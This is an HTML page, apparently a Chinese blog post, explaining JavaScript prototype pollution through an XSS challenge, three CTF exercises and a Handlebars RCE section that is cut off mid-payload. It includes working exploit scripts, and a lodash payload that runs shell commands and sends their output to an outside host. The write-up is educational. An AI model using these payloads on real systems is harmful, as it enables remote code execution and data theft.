@@ -1,0 +1,1207 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>JavaScript原型链污染 - Twings</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期四, 四月 11日 2019, 10:38 上午
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    4.1k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      21 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近看到一篇关于在模板注入中利用原型链污染RCE的文章，才想起来还没有总结过原型链污染这种JavaScript的特殊漏洞，所以打算写一篇文章，通过XSS、几道CTF题目和复现漏洞的方式，温故知新一下。</p>
+<a id="more"></a>
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p><a href="#XSS">1. XSS</a></p>
+<p><a href="#CTF1">2. CTF1</a></p>
+<p><a href="#CTF2">3. CTF2</a></p>
+<p><a href="#CTF3">4. CTF3</a></p>
+<p><a href="#Handlebars模板注入到RCE">5. Handlebars模板注入到RCE</a></p>
+<h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>有关原型链的详细解析看这里：<a href="https://blog.csdn.net/cc18868876837/article/details/81211729" target="_blank" rel="noopener">https://blog.csdn.net/cc18868876837/article/details/81211729</a></p>
+<p>我这里只举一个简单的栗子：</p>
+<pre><code class="Javascript">&gt; a = []
+&lt; []
+&gt; a.__proto__.Twings = &quot;Aluvion&quot;
+&lt; &quot;Aluvion&quot;
+&gt; b = []
+&lt; []
+&gt; b.Twings
+&lt; &quot;Aluvion&quot;
+</code></pre>
+<p>简单来说就是通过给一个实例的原型对象赋值，影响同一个原型对象的其他实例。</p>
+<hr>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>prompt(1) to win 传送门：<a href="http://prompt.ml/13" target="_blank" rel="noopener">http://prompt.ml/13</a></p>
+<p>关键代码：</p>
+<pre><code class="javascript">...
+function extend(obj) {
+    var source, prop;
+    for (var i = 1, length = arguments.length; i &lt; length; i++) {
+        source = arguments[i];
+        for (prop in source) {
+            obj[prop] = source[prop];
+        }
+    }
+    return obj;
+}
+...
+var config = extend({
+    source: &#39;http://placehold.it/350x150&#39;
+}, JSON.parse(input));
+if (/[^\w:\/.]/.test(config.source)) {
+    delete config.source;
+}
+var source = config.source.replace(/&quot;/g, &#39;&#39;);
+return &#39;&lt;img src=&quot;{{source}}&quot;&gt;&#39;.replace(&#39;{{source}}&#39;, source);
+...
+</code></pre>
+<p>目标就是最后在source中逃逸出一个双引号来。</p>
+<p>如果source的格式不符合要求，就会删除config.source，所以是不能直接通过source引入双引号的。这时候我们就可以使用原型链污染的方法了：给config的原型对象整一个恶意的source属性，同时提交一个不符合要求的source，这样一来config.source被删除后，后面的代码无法找到这个属性，就会去到config的原型对象去寻找，找到我们的恶意的source，我们就成功地污染了config.source，能够绕过过滤引入双引号。</p>
+<p>但是这个replace要怎么绕过呢？</p>
+<p>这就涉及到一个JavaScript的replace函数的黑魔法了：<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#Description" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#Description</a> 通过特殊替换模式，我们可以逃逸出一个双引号来，用以闭合img的src。</p>
+<p>payload：</p>
+<pre><code class="json">{&quot;source&quot;:&quot;~&quot;,&quot;__proto__&quot;:{&quot;source&quot;:&quot;$`onerror=prompt(1)&gt;\&quot;&quot;}}
+{&quot;source&quot;:&quot;~&quot;,&quot;__proto__&quot;:{&quot;source&quot;:&quot;$&#39;&lt;script&gt;prompt(1)&lt;/script&gt;\&quot;&quot;}}
+</code></pre>
+<hr>
+<h3 id="CTF1"><a href="#CTF1" class="headerlink" title="CTF1"></a>CTF1</h3><p>代码如下，用npm把依赖下载好，再在views目录随便写一个HTML，即可将环境跑起来：</p>
+<pre><code class="javascript">const express = require(&#39;express&#39;)
+var hbs = require(&#39;hbs&#39;);
+var bodyParser = require(&#39;body-parser&#39;);
+const md5 = require(&#39;md5&#39;);
+var morganBody = require(&#39;morgan-body&#39;);
+const app = express();
+var user = []; //empty for now
+
+var matrix = [];
+for (var i = 0; i &lt; 3; i++){
+    matrix[i] = [null , null, null];
+}
+
+function draw(mat) {
+    var count = 0;
+    for (var i = 0; i &lt; 3; i++){
+        for (var j = 0; j &lt; 3; j++){
+            if (matrix[i][j] !== null){
+                count += 1;
+            }
+        }
+    }
+    return count === 9;
+}
+
+app.use(&#39;/static&#39;, express.static(&#39;static&#39;));
+app.use(bodyParser.json());
+app.set(&#39;view engine&#39;, &#39;html&#39;);
+morganBody(app);
+app.engine(&#39;html&#39;, require(&#39;hbs&#39;).__express);
+
+app.get(&#39;/&#39;, (req, res) =&gt; {
+
+    for (var i = 0; i &lt; 3; i++){
+        matrix[i] = [null , null, null];
+
+    }
+    res.render(&#39;index&#39;);
+})
+
+
+app.get(&#39;/admin&#39;, (req, res) =&gt; { 
+    /*this is under development I guess ??*/
+
+    if(user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken){
+        res.send(&#39;Hey admin your flag is &lt;b&gt;flag{prototype_pollution_is_very_dangerous}&lt;/b&gt;&#39;);
+    } 
+    else {
+        res.status(403).send(&#39;Forbidden&#39;);
+    }    
+}
+)
+
+
+app.post(&#39;/api&#39;, (req, res) =&gt; {
+    var client = req.body;
+    var winner = null;
+
+    if (client.row &gt; 3 || client.col &gt; 3){
+        client.row %= 3;
+        client.col %= 3;
+    }
+
+    matrix[client.row][client.col] = client.data;
+    console.log(matrix);
+    for(var i = 0; i &lt; 3; i++){
+        if (matrix[i][0] === matrix[i][1] &amp;&amp; matrix[i][1] === matrix[i][2] ){
+            if (matrix[i][0] === &#39;X&#39;) {
+                winner = 1;
+            }
+            else if(matrix[i][0] === &#39;O&#39;) {
+                winner = 2;
+            }
+        }
+        if (matrix[0][i] === matrix[1][i] &amp;&amp; matrix[1][i] === matrix[2][i]){
+            if (matrix[0][i] === &#39;X&#39;) {
+                winner = 1;
+            }
+            else if(matrix[0][i] === &#39;O&#39;) {
+                winner = 2;
+            }
+        }
+    }
+
+    if (matrix[0][0] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][2] &amp;&amp; matrix[0][0] === &#39;X&#39;){
+        winner = 1;
+    }
+    if (matrix[0][0] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][2] &amp;&amp; matrix[0][0] === &#39;O&#39;){
+        winner = 2;
+    } 
+
+    if (matrix[0][2] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][0] &amp;&amp; matrix[2][0] === &#39;X&#39;){
+        winner = 1;
+    }
+    if (matrix[0][2] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][0] &amp;&amp; matrix[2][0] === &#39;O&#39;){
+        winner = 2;
+    }
+
+    if (draw(matrix) &amp;&amp; winner === null){
+        res.send(JSON.stringify({winner: 0}))
+    }
+    else if (winner !== null) {
+        res.send(JSON.stringify({winner: winner}))
+    }
+    else {
+        res.send(JSON.stringify({winner: -1}))
+    }
+
+})
+app.listen(3000, () =&gt; {
+    console.log(&#39;app listening on port 3000!&#39;)
+})
+</code></pre>
+<p>代码很简单，目标就是向/admin POST一个querytoken，并且正好与服务端的admintoken的MD5值相等。admintoken是undefined的，所以我们需要想办法修改它，这时候我们仔细审计代码，可以看到这么几行代码：</p>
+<pre><code class="javascript">...
+var user = [];
+var matrix = [];
+...
+var client = req.body;
+matrix[client.row][client.col] = client.data;
+</code></pre>
+<p>我们可以看到，admintoken所在的user实例和matrix实例都是数组类型，而后面又以我们可控的输入对它进行了两级的赋值，那么这里是不是就存在一个原型链污染的漏洞？</p>
+<p>我们可以通过覆盖matrix的原型对象，来污染user.admintoken，这样一来admintoken就是我们可控的了，解题脚本如下：</p>
+<pre><code class="python"># -*- coding:utf8 -*-
+import requests
+import json
+
+headers = {
+    &#39;Content-Type&#39;: &#39;application/json&#39;
+}
+data = {
+    &#39;row&#39;: &#39;__proto__&#39;,
+    &#39;col&#39;: &#39;admintoken&#39;,
+    &#39;data&#39;: &#39;Twings&#39;
+}
+myd = requests.session()
+url = &quot;http://localhost:3000/api&quot;
+url2 = &quot;http://localhost:3000/admin?querytoken=f25758d1dec0c49eb22049d3080e87d0&quot;
+myd.post(url, headers=headers, data=json.dumps(data))
+print myd.get(url2).content
+</code></pre>
+<hr>
+<h3 id="CTF2"><a href="#CTF2" class="headerlink" title="CTF2"></a>CTF2</h3><p>server.js：</p>
+<pre><code class="javascript">var fs       = require(&#39;fs&#39;); 
+var server   = require(&#39;http&#39;).createServer()
+var io       = require(&#39;socket.io&#39;)(server)
+var clientManager = require(&#39;./clientManager&#39;)
+var helper = require(&#39;./helper&#39;)
+
+var defaultSettings = JSON.parse(fs.readFileSync(&#39;default_settings.json&#39;, &#39;utf8&#39;));
+
+function sendMessageToClient(client, from, message) {
+    var msg = {
+        from: from,
+        message: message
+    };
+
+    client.emit(&#39;message&#39;, msg);
+    console.log(msg)
+    return true;
+}
+
+function sendMessageToChannel(channel, from, message) {
+    var msg = {
+        from: typeof from !== &#39;string&#39; ? clientManager.getUsername(from): from,
+        message: message,
+        channel: channel
+    };
+
+    if(typeof from !== &#39;string&#39;) {
+        if(!clientManager.isSubscribedTo(from, channel)) {
+            console.log(&#39;Could not send message&#39;,msg,&#39; from&#39;, 
+                clientManager.getUsername(from),&#39;to&#39;,channel,&#39;because he is not subscribed.&#39;)
+            return false;
+        }
+    }
+
+    var clients = clientManager.getSubscribedToChannel(channel);
+
+    for(var i = 0; i&lt;clients.length;i++) {
+        if(typeof from !== &#39;string&#39;) {
+            if(clients[i].id == from.id) {
+                continue;
+            }
+        }
+
+        clients[i].emit(&#39;message&#39;, msg);
+    }
+
+    console.log(msg)
+    return true;
+}
+
+io.on(&#39;connection&#39;, function (client) { 
+    client.on(&#39;register&#39;, function(inUser) {
+        try {
+            newUser = helper.clone(JSON.parse(inUser))
+
+            if(!helper.validUser(newUser)) {
+                sendMessageToClient(client,&quot;Server&quot;, 
+                    &#39;Invalid settings.&#39;)
+                return client.disconnect();
+            } 
+
+            var keys = Object.keys(defaultSettings);
+            for (var i = 0; i &lt; keys.length; ++i) {
+                if(newUser[keys[i]] === undefined) {
+                    newUser[keys[i]] = defaultSettings[keys[i]]
+                }
+            } 
+
+            if (!clientManager.isUserAvailable(newUser.name)) {
+                sendMessageToClient(client,&quot;Server&quot;, 
+                    newUser.name + &#39; is not available&#39;)
+                return client.disconnect(); 
+            }
+
+            clientManager.registerClient(client, newUser)
+            return sendMessageToClient(client,&quot;Server&quot;, 
+                newUser.name + &#39; registered&#39;)
+        } catch(e) { console.log(e); client.disconnect() }
+    });
+
+    client.on(&#39;join&#39;, function(channel) {
+        try {
+            clientManager.joinChannel(client, channel);
+            sendMessageToClient(client,&quot;Server&quot;, 
+                &quot;You joined channel&quot;, channel)
+
+            var u = clientManager.getUsername(client);
+            var c = clientManager.getCountry(client);
+
+            sendMessageToChannel(channel,&quot;Server&quot;, 
+                helper.getAscii(&quot;User &quot; + u + &quot; living in &quot; + c + &quot; joined channel&quot;))
+        } catch(e) { console.log(e); client.disconnect() }
+    });
+
+    client.on(&#39;leave&#39;, function(channel) {
+        try {
+            client .join(channel);
+            clientManager.leaveChannel(client, channel);
+            sendMessageToClient(client,&quot;Server&quot;, 
+                &quot;You left channel&quot;, channel)
+
+            var u = clientManager.getUsername(client);
+            var c = clientManager.getCountry(client);
+            sendMessageToChannel(channel, &quot;Server&quot;, 
+                helper.getAscii(&quot;User &quot; + u + &quot; living in &quot; + c + &quot; left channel&quot;))
+        } catch(e) { console.log(e); client.disconnect() }
+    });
+
+    client.on(&#39;message&#39;, function(message) {
+        try {
+            message = JSON.parse(message);
+            if(message.channel === undefined) {
+                console.log(clientManager.getUsername(client),&quot;said:&quot;, message.msg);
+            } else {
+                sendMessageToChannel(message.channel, client, message.msg);
+            }
+        } catch(e) { console.log(e); client.disconnect() }
+    });
+
+    client.on(&#39;disconnect&#39;, function () {
+        try {
+            console.log(&#39;client disconnect...&#39;, client.id)
+
+            var oldclient = clientManager.removeClient(client);
+            if(oldclient !== undefined) {
+                for (const [channel, state] of Object.entries(oldclient.ch)) {
+                    if(!state) continue;
+                    sendMessageToChannel(channel, &quot;Server&quot;, 
+                        &quot;User &quot; + oldclient.u.name + &quot; left channel&quot;);
+                } 
+            }
+        } catch(e) { console.log(e); client.disconnect() }
+    })
+
+  client.on(&#39;error&#39;, function (err) {
+    console.log(&#39;received error from client:&#39;, client.id)
+    console.log(err)
+  })
+});
+
+server.listen(3000, function (err) {
+  if (err) throw err;
+  console.log(&#39;listening on port 3000&#39;);
+});
+</code></pre>
+<p>helper.js：</p>
+<pre><code class="javascript">var exports = module.exports = {
+    clone: function(obj) {
+
+        if (typeof obj !== &#39;object&#39; ||
+            obj === null) {
+
+            return obj;
+        }
+
+        var newObj;
+        var cloneDeep = false;
+
+        if (!Array.isArray(obj)) {
+            if (Buffer.isBuffer(obj)) {
+                newObj = new Buffer(obj);
+            }
+            else if (obj instanceof Date) {
+                newObj = new Date(obj.getTime());
+            }
+            else if (obj instanceof RegExp) {
+                newObj = new RegExp(obj);
+            }
+            else {
+
+                var proto = Object.getPrototypeOf(obj);
+                if (proto &amp;&amp;
+                    proto.isImmutable) {
+
+                    newObj = obj;
+                }
+                else {
+                    newObj = Object.create(proto);
+                    cloneDeep = true;
+                }
+            }
+        }
+        else {
+            newObj = [];
+            cloneDeep = true;
+        }
+
+        if (cloneDeep) {
+            var keys = Object.getOwnPropertyNames(obj);
+
+            for (var i = 0; i &lt; keys.length; ++i) {
+                var key = keys[i];
+                var descriptor = Object.getOwnPropertyDescriptor(obj, key);
+                if (descriptor &amp;&amp;
+                    (descriptor.get ||
+                     descriptor.set)) {
+
+                    Object.defineProperty(newObj, key, descriptor);
+                }
+                else {
+                    newObj[key] = this.clone(obj[key]);
+                }
+            }
+        }
+
+        return newObj;
+    }, 
+    validUser: function(inp) {
+        var block = [&quot;source&quot;,&quot;port&quot;,&quot;font&quot;,&quot;country&quot;,
+                     &quot;location&quot;,&quot;status&quot;,&quot;lastname&quot;];
+        if(typeof inp !== &#39;object&#39;) {
+            return false;
+        } 
+
+        var keys = Object.keys( inp);
+        for(var i = 0; i&lt; keys.length; i++) {
+            key = keys[i];
+
+            if(block.indexOf(key) !== -1) {
+                return false;
+            }
+        }
+
+        var r =/^[a-z0-9]+$/gi;
+        if(inp.name === undefined || !r.test(inp.name)) {
+            return false;
+        }
+
+        return true;
+    },
+    getAscii: function(message) {
+        var e = require(&#39;child_process&#39;);
+        return e.execSync(&quot;cowsay &#39;&quot; + message + &quot;&#39;&quot;).toString();
+    }
+}
+</code></pre>
+<p>clientManager.js：</p>
+<pre><code class="javascript">var helper = require(&#39;./helper&#39;)
+var exports = module.exports = {
+    clients: {},
+    getUserByClient: function(client) {
+        return this.clients[client.id]
+    },
+    registerClient: function (client, user) {
+        this.clients[client.id] = { &#39;c&#39;: client, 
+                                    &#39;u&#39;: user, 
+                                    &#39;ch&#39;: {} 
+        };
+    },
+    removeClient: function (client) {
+        var client_old = this.clients[client.id]
+        if(client_old === undefined)
+            return client_old
+
+        delete client_old.c
+        client_old = helper.clone(client_old)
+        delete this.clients[client.id];
+        return client_old
+    },
+    isUserAvailable: function (userName) {
+        for (var [key, user] of Object.entries(this.clients)) {
+          if(user.u.name == userName) {
+            return false;
+          }
+        }
+        return true;
+    },
+    getUsername: function (client) {
+        return this.clients[client.id].u.name;
+    },
+    getLastname: function (client) {
+        return this.clients[client.id].u.lastname;
+    },
+    getCountry: function (client) {
+        return this.clients[client.id].u.country;
+    },
+    getLocation: function (client) {
+        return this.clients[client.id].u.location;
+    },
+    getStatus: function (client) {
+        return this.clients[client.id].u.status;
+    },
+    joinChannel: function (client, channel) {
+        this.clients[client.id].ch[channel] = true; 
+    },
+    leaveChannel: function (client, channel) {
+        this.clients[client.id].ch[channel] = false; 
+    },
+    getSubscribedToChannel: function(channel) {
+        var subscribed = [];
+        for (var [key, user] of Object.entries(this.clients)) {
+            if(user.ch[channel] === true) {
+                subscribed.push(user.c);
+            }
+        } 
+        return subscribed;
+    },
+    isSubscribedTo: function(client, channel) {
+        var user = this.getUserByClient(client)
+
+        for (var [chs, state] of Object.entries(user.ch)) {
+            if(state === true &amp;&amp; chs === channel) {
+                return true;
+            }
+        }
+
+        return false;    
+    },
+};
+</code></pre>
+<p>client.js：</p>
+<pre><code class="javascript">const io = require(&#39;socket.io-client&#39;)
+const socket = io.connect(&#39;https://chat.dctfq18.def.camp&#39;)
+
+if(process.argv.length != 4) {
+  console.log(&#39;name and channel missing&#39;)
+   process.exit()
+}
+console.log(&#39;Logging as &#39; + process.argv[2] + &#39; on &#39; + process.argv[3])
+var inputUser = {
+  name: process.argv[2], 
+};
+
+socket.on(&#39;message&#39;, function(msg) {
+  console.log(msg.from,&quot;[&quot;, msg.channel!==undefined?msg.channel:&#39;Default&#39;,&quot;]&quot;, &quot;says:\n&quot;, msg.message);
+});
+
+socket.on(&#39;error&#39;, function (err) {
+  console.log(&#39;received socket error:&#39;)
+  console.log(err)
+})
+
+socket.emit(&#39;register&#39;, JSON.stringify(inputUser));
+socket.emit(&#39;message&#39;, JSON.stringify({ msg: &quot;hello&quot; }));
+socket.emit(&#39;join&#39;, process.argv[3]);//ps: you should keep your channels private
+socket.emit(&#39;message&#39;, JSON.stringify({ channel: process.argv[3], msg: &quot;hello channel&quot; }));
+socket.emit(&#39;message&#39;, JSON.stringify({ channel: &quot;test&quot;, msg: &quot;i own you&quot; }));
+</code></pre>
+<p>default_settings.json：</p>
+<pre><code class="json">{
+    &quot;name&quot;: &quot;Default&quot;,
+    &quot;lastname&quot;: &quot;Username&quot;,
+    &quot;status&quot;: &quot;Status Text&quot;,
+    &quot;location&quot;: &quot;127.0.0.1&quot;,
+    &quot;country&quot;: &quot;No Man`s Land&quot;, 
+    &quot;source&quot;: &quot;Website&quot;,
+    &quot;port&quot;: &quot;3000&quot;
+}
+</code></pre>
+<p>package.json：</p>
+<pre><code class="json">{
+  &quot;name&quot;: &quot;chat&quot;,
+  &quot;version&quot;: &quot;1.0.0&quot;,
+  &quot;description&quot;: &quot;DCTF&quot;,
+  &quot;main&quot;: &quot;NA&quot;,
+  &quot;dependencies&quot;: {
+    &quot;socket.io&quot;: &quot;^2.1.1&quot;,
+    &quot;socket.io-client&quot;: &quot;^2.1.1&quot;
+  },
+  &quot;devDependencies&quot;: {},
+  &quot;scripts&quot;: {
+    &quot;test&quot;: &quot;NA&quot;
+  },
+  &quot;repository&quot;: {
+    &quot;type&quot;: &quot;git&quot;,
+    &quot;url&quot;: &quot;NA&quot;
+  },
+  &quot;keywords&quot;: [
+    &quot;DCTF&quot;
+  ],
+  &quot;author&quot;: &quot;Andrei&quot;,
+  &quot;license&quot;: &quot;UNLICENSED&quot;
+}
+</code></pre>
+<p>审计一下代码，可以看到代码实现了一个socket服务器，客户端可以进行注册、加入聊天室、发言等，而最可疑的地方则在helper.js的getAscii函数：</p>
+<pre><code class="javascript">getAscii: function(message) {
+    var e = require(&#39;child_process&#39;);
+    return e.execSync(&quot;cowsay &#39;&quot; + message + &quot;&#39;&quot;).toString();
+}
+</code></pre>
+<p>很明显如果message可控，那么这里就存在一个命令注入漏洞，我们去看看函数调用，可以看到有两个地方用相同的参数调用了这个函数：</p>
+<pre><code class="javascript">sendMessageToChannel(channel, &quot;Server&quot;, helper.getAscii(&quot;User &quot; + u + &quot; living in &quot; + c + &quot; left channel&quot;))
+</code></pre>
+<p>如果我们可以控制注册时的name和country，就可以进行命令注入了。接下来看一下注册逻辑，发现代码调用了validUser函数进行了过滤：</p>
+<pre><code class="javascript">...
+var block = [&quot;source&quot;,&quot;port&quot;,&quot;font&quot;,&quot;country&quot;,
+             &quot;location&quot;,&quot;status&quot;,&quot;lastname&quot;];
+...
+for(var i = 0; i&lt; keys.length; i++) {
+    key = keys[i];
+
+    if(block.indexOf(key) !== -1) {
+        return false;
+    }
+}
+
+var r =/^[a-z0-9]+$/gi;
+if(inp.name === undefined || !r.test(inp.name)) {
+    return false;
+}
+...
+</code></pre>
+<p>name只能由小写字母和数字组成，而我们不能对country进行设置，那怎么办呢？我们能不能通过原型链来污染country？可以看到服务端调用helper.clone来克隆了我们的JSON输入，我们仔细审计helper.clone函数，可以看到最后进行了对象克隆赋值，将本来只是属性名的__proto__指向了对象原型:</p>
+<pre><code class="javascript">newObj[key] = this.clone(obj[key]);
+</code></pre>
+<p>我们可以使用vscode来断点调试一下：</p>
+<p><img src="/css/images/js_prototype_pollution/2019041101.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/js_prototype_pollution/2019041102.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/js_prototype_pollution/2019041103.png" srcset="/img/loading.gif" alt=""></p>
+<p>成功覆盖了原型对象，这样一来我们就可以注入命令了。</p>
+<p>payload：</p>
+<pre><code class="javascript">const io = require(&#39;socket.io-client&#39;)
+const socket = io.connect(&#39;http://127.0.0.1:3000&#39;)
+
+console.log(process.argv.length);
+
+if(process.argv.length != 4) {
+    console.log(&#39;name and channel missing&#39;)
+    process.exit()
+}
+console.log(&#39;Logging as &#39; + process.argv[2] + &#39; on &#39; + process.argv[3])
+var inputUser = {
+    name: process.argv[2],
+};
+
+socket.on(&#39;message&#39;, function(msg) {
+    console.log(msg.from,&quot;[&quot;, msg.channel!==undefined?msg.channel:&#39;Default&#39;,&quot;]&quot;, &quot;says:\n&quot;, msg.message);
+});
+
+socket.on(&#39;error&#39;, function (err) {
+    console.log(&#39;received socket error:&#39;)
+    console.log(err)
+})
+
+socket.emit(&#39;register&#39;, &#39;{&quot;name&quot;:&quot;Twings&quot;, &quot;__proto__&quot;:{&quot;country&quot;:&quot;\&#39;;ls;echo \&#39;lala&quot;}}&#39;)
+socket.emit(&#39;message&#39;, JSON.stringify({ msg: &quot;hello&quot; }));
+socket.emit(&#39;join&#39;, process.argv[3]);//ps: you should keep your channels private
+socket.emit(&#39;message&#39;, JSON.stringify({ channel: process.argv[3], msg: &quot;hello channel&quot; }));
+socket.emit(&#39;message&#39;, JSON.stringify({ channel: &quot;test&quot;, msg: &quot;i own you&quot; }));
+</code></pre>
+<hr>
+<h3 id="CTF3"><a href="#CTF3" class="headerlink" title="CTF3"></a>CTF3</h3><p>源码地址：<a href="https://github.com/phith0n/code-breaking/tree/master/2018/thejs" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/tree/master/2018/thejs</a></p>
+<p>注意lodash版本为4.17.4，高版本的merge函数无法污染原型链。</p>
+<p>代码很简单，只有一个页面，逻辑也很简单，将选择的语言加入session，然后渲染模板。关注这两部分代码：</p>
+<pre><code class="javascript">let data = req.session.data || {language: [], category: []}
+if (req.method == &#39;POST&#39;) {
+    data = lodash.merge(data, req.body)
+    req.session.data = data
+}
+</code></pre>
+<pre><code class="javascript">fs.readFile(filePath, (err, content) =&gt; {
+    if (err) return callback(new Error(err))
+    let compiled = lodash.template(content)
+    let rendered = compiled({...options})
+
+    return callback(null, rendered)
+})
+</code></pre>
+<p>merge是一个容易发生原型链污染的函数：</p>
+<p><img src="/css/images/js_prototype_pollution/2019041104.png" srcset="/img/loading.gif" alt=""></p>
+<p>我们可以通过这个函数来污染某个属性，那我们应该对谁下手呢？我们同样可以断点调试，然后跟入函数中看看，比如代码调用的lodash的另一个函数lodash.template：</p>
+<pre><code class="javascript">var sourceURL = &#39;//# sourceURL=&#39; +
+    (&#39;sourceURL&#39; in options
+     ? options.sourceURL
+     : (&#39;lodash.templateSources[&#39; + (++templateCounter) + &#39;]&#39;)
+    ) + &#39;\n&#39;;
+...
+var result = attempt(function() {
+    return Function(importsKeys, sourceURL + &#39;return &#39; + source)
+    .apply(undefined, importsValues);
+});
+</code></pre>
+<p>可以看到在options.sourceURL存在的情况下，会将options.sourceURL赋值给sourceURL，然后拼接进入Function的第二个参数中，所以我们只要污染了options.sourceURL，我们的恶意代码就会经过attempt、baseRest、overRest，最后来到apply通过func.call调用，我们就可以执行任意Javascript代码了。</p>
+<p>payload：</p>
+<pre><code class="python"># -*- coding:utf8 -*-
+import requests
+import json
+
+headers = {
+    &#39;Content-Type&#39;: &#39;application/json&#39;
+}
+data = {
+    &#39;__proto__&#39;: {
+        &#39;sourceURL&#39;: &quot;test\nvar require = global.require || global.process.mainModule.constructor._load;&quot;
+                     &quot;var result = require(&#39;child_process&#39;).execSync(&#39;dir&#39;);&quot;
+                     &quot;var req = require(&#39;http&#39;).request(`http://*.*.*.*/?${result}`);&quot;
+                     &quot;req.end();\n//&quot;
+    }
+}
+myd = requests.session()
+url = &quot;http://localhost:3000&quot;
+myd.post(url, headers=headers, data=json.dumps(data))
+myd.get(url)
+</code></pre>
+<hr>
+<h3 id="Handlebars模板注入到RCE"><a href="#Handlebars模板注入到RCE" class="headerlink" title="Handlebars模板注入到RCE"></a>Handlebars模板注入到RCE</h3><p>用package.json安装4.0.12版本的handlebars，然后写个测试脚本：</p>
+<pre><code class="javascript">var handlebars = require(&#39;handlebars&#39;),
+fs = require(&#39;fs&#39;);
+data = {
+    &quot;name&quot;: &quot;Twings&quot;
+}
+
+fs.readFile(&#39;example.html&#39;, &#39;utf-8&#39;, function(error, source){
+  var template = handlebars.compile(source);
+  var html = template(data);
+  console.log(html)
+});
+</code></pre>
+<p>两种payload：</p>
+<pre><code class="handlebars">{{#with this as |obj|}}
+    {{#with (obj.constructor.keys "1") as |arr|}} # 创建一个array
+        {{arr.pop}} # 把array清空
